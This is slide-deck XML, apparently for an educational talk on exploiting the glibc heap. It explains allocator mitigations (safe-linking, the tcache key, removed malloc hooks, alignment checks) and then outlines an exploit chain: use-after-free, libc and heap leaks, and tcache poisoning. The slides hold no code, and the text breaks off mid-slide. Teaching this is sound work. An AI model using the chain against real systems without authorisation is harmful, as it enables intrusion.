          <a:xfrm>
            <a:off x="731520" y="2377440"/>
            <a:ext cx="50292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fd = (chunk_addr &gt;&gt; 12) ^ next.</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Can't forge fd without a heap leak.</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Google Shape;118;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1600200"/>
            <a:ext cx="5440680" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2439"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="178308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2100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2100">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>tcache key</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120" name="Google Shape;120;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9784080" y="1819656"/>
            <a:ext cx="1691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B341"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>glibc 2.29</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="Google Shape;121;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="2377440"/>
            <a:ext cx="50292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per-chunk key catches naive</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double-frees into tcache.</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Google Shape;122;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3749040"/>
            <a:ext cx="5440680" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2439"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="393192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2100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2100">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>hooks not called</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Google Shape;124;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4069080" y="3968496"/>
            <a:ext cx="1691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B341"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>glibc 2.34</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Google Shape;125;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4526280"/>
            <a:ext cx="50292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__malloc/__free_hook still exist —</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malloc.c stopped reading them.</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126" name="Google Shape;126;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="3749040"/>
            <a:ext cx="5440680" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2439"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="393192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2100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2100">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>aligned_OK</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Google Shape;128;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9784080" y="3968496"/>
            <a:ext cx="169164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B341"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>glibc 2.32</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="129" name="Google Shape;129;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="4526280"/>
            <a:ext cx="5029200"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tcache_get rejects a returned</a:t>
            </a:r>
            <a:endParaRPr sz="125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chunk that isn't 16-byte aligned.</a:t>
            </a:r>
            <a:endParaRPr sz="12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134" name="Shape 134"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="Google Shape;135;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1097280"/>
            <a:ext cx="12191695"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42C"/>
              </a:buClr>
              <a:buSzPts val="21000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="21000">
                <a:solidFill>
                  <a:srgbClr val="20242C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT III</a:t>
            </a:r>
            <a:endParaRPr sz="21000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name="Google Shape;136;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="233172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500"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT III</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Google Shape;137;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2743200"/>
            <a:ext cx="111556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5200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="5200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The Break-In</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="Google Shape;138;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="388620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400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>With traps.</a:t>
            </a:r>
            <a:endParaRPr sz="1400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Google Shape;139;p9"/>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09 / 27</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144" name="Shape 144"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name="Google Shape;145;p10"/>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III · THE MAP</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="Google Shape;146;p10"/>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10 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="147" name="Google Shape;147;p10"/>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The plan</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Google Shape;148;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="1371600"/>
            <a:ext cx="347472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1  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>UAF (use-after-free)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="149" name="Google Shape;149;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3977639" y="1371600"/>
            <a:ext cx="457200" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="45700" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="54850">
            <a:sp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a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="150" name="Google Shape;150;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="1371600"/>
            <a:ext cx="658368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0" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>the binary frees a chunk but keeps the pointer</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="1911096"/>
            <a:ext cx="274320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>↓</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Google Shape;152;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="2130552"/>
            <a:ext cx="347472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2  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>libc leak (unsorted bin)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="153" name="Google Shape;153;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3977639" y="2130552"/>
            <a:ext cx="457200" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="45700" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="54850">
            <a:sp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a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Google Shape;154;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="2130552"/>
            <a:ext cx="658368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lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Free a chunk into the unsorted bin (size &gt; 0x410 (1040), or tcache bin is full) → glibc writes a main_arena pointer into its fd</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name="Google Shape;155;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="2670048"/>
            <a:ext cx="274320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>↓</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name="Google Shape;156;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="2889504"/>
            <a:ext cx="347472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3  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>heap leak (fd &gt;&gt; 12)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="157" name="Google Shape;157;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3977639" y="2889504"/>
            <a:ext cx="457200" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="45700" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="54850">
            <a:sp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a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Google Shape;158;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="2889504"/>
            <a:ext cx="658368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0" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>safe-linking leaks chunk addr &gt;&gt; 12 from tcache</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Google Shape;159;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="3429000"/>
            <a:ext cx="274320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>↓</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Google Shape;160;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="3648456"/>
            <a:ext cx="347472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4  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>tcache poison</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Google Shape;161;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3977639" y="3648456"/>
            <a:ext cx="457200" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="45700" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="54850">
            <a:sp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a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162" name="Google Shape;162;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="3648456"/>
            <a:ext cx="658368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0" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>corrupt fd → next malloc returns our target</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163" name="Google Shape;163;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="4187952"/>
            <a:ext cx="274320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
